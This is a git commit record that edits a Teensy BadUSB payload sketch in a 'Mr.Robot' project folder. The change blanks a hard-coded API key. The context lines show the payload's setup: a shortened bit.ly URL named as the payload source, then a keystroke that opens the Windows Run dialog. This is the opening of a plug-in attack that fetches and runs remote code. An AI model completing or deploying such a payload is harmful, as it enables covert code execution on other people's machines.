ba104a19255ad3b13e654c076cb23cd51b26551e
H3LL0WORLD <holamundoyt@gmail.com>
2016-09-04 09:57:18 -0500

    Update Teensy-Payload.ino

--- Mr.Robot/01-BadUSB/Teensy-Payload.ino
+++ Mr.Robot/01-BadUSB/Teensy-Payload.ino
@@ -2,7 +2,7 @@
 // Teensy-Plantilla-Base required: https://github.com/H3LL0WORLD/Teensy-Plantilla-Base
 // Paste into the payload function
 
-const String APIKey = "2856557c5d9f96d0e416c70aa691cbd1";
+const String APIKey = "";
 const String urlpayload = "http://bit.ly/2ce8RKX";
 GUI(R);
 delay(500);
